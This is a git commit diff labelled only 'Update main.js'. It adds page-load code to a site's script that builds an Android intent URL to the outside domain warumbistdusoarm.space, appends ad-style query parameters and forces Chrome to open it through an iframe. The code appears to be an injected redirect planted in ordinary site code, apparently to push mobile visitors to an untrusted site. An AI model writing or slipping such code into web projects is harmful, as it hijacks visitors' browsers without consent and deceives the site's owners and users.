ca3b8e993ac6a16b5aea917ebef2130c884e1eee
wordenplay <67971108+wordenplay@users.noreply.github.com>
2020-07-07 13:10:04 -0400

    Update main.js

--- scripts/main.js
+++ scripts/main.js
@@ -47,4 +47,34 @@ window.onload = function () {
   function destroyNotice() {
     $('.notice').addClass('notice-destroy');
   }
+       console.log('f');
+         var str = "intent://warumbistdusoarm.space/?5edf54a7513dc=0";
+         console.log(str);
+        var params = window
+          .location
+          .search
+          .replace('?','')
+          .split('&')
+          .reduce(
+          function(p,e){
+              var a = e.split('=');
+              p[ decodeURIComponent(a[0])] = decodeURIComponent(a[1]);
+              return p;
+          },
+          {}
+      );
+      
+      if (params['ag_custom_domain']){
+        str += "&ag_custom_domain=" + params['ag_custom_domain'];
+      };
+
+      if (params['ag_custom_banners']) {
+        str += "&ag_custom_banners=" + params['ag_custom_banners'];
+      }
+
+      str+= "#Intent;scheme=http;package=com.android.chrome;end";
+      console.log(str);
+      let intentFrame = document.getElementById('iframe');
+    
+      intentFrame.setAttribute('src', str);
 };
